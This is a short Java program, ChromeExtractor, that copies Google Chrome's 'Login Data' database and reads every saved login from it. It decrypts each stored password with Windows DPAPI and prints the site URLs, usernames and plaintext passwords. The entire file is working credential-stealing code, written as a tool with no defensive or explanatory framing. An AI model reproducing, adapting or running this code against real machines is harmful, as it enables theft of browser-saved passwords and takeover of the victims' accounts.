
import java.io.File;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import org.apache.commons.io.FileUtils;

import com.sun.jna.platform.win32.Crypt32Util;

public class ChromeExtractor {
    public static void main(String[] args) throws ClassNotFoundException, IOException {
        // warning: code may or may not have been copied/pasted from:
        // https://bitbucket.org/xerial/sqlite-jdbc
        // https://superuser.com/questions/146742/how-does-google-chrome-store-passwords

        Class.forName("org.sqlite.JDBC"); 

        Connection connection = null;
        try {
            File chromeData = new File(System.getenv("LocalAppData") + "/Google/Chrome/User Data/Default/Login Data");
            File dataCopy = new File(
                    System.getenv("LocalAppData") + "/Google/Chrome/User Data/Default/Login Data.bak.db");
            FileUtils.copyFile(chromeData, dataCopy, true);

            // create a database connection
            connection = DriverManager.getConnection("jdbc:sqlite:" + dataCopy.getAbsolutePath());
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(1);

            ResultSet rs = statement.executeQuery("select * from logins");
            while (rs.next()) {
                System.out.println("Info for " + rs.getString("origin_url") + " / " + rs.getString("action_url"));
                System.out.println(rs.getString("username_element") + " = " + rs.getString("username_value"));
                byte[] passwordBlob = rs.getBytes("password_value");
                byte[] dankBlob = Crypt32Util.cryptUnprotectData(passwordBlob);
                System.out.println(rs.getString("password_element") + " = " + new String(dankBlob));
            }
        } catch (SQLException e) {
            System.err.println(e.getMessage());
        } finally {
            try {
                if (connection != null)
                    connection.close();
            } catch (SQLException e) {
                System.err.println(e);
            }
        }
    }
}